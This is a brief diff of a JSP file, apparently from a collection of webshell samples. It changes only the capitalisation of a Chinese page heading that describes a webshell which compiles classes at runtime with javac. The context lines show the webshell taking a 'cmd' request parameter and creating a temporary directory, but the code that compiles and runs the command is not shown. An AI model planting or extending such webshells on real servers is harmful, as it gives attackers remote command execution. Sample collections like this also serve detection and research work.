@@ -13,7 +13,7 @@
 <%@ page import="java.io.File" %>
 <html>
 <body>
-<h2>javac动态编译class的JSP Webshell</h2>
+<h2>javac动态编译class的JSP WebShell</h2>
 <%
     String c = request.getParameter("cmd");
     String tmpPath = Files.createTempDirectory("xxxxx").toFile().getPath();
